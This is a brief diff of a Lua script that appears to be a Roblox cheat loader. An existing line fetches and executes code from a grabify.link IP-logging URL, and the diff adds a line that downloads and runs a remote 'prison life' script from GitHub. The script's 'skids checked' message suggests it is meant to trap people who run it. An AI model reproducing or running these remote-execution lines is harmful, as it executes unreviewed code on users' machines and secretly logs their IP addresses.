@@ -4,4 +4,5 @@ local skidcheck = "skids checked."
 print(execute)
 
 loadstring(game:HttpGet("https://grabify.link/GBGWGK", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/loganthedevscripts/dalkdev/main/prison%20life", true))()
 print(skidcheck)
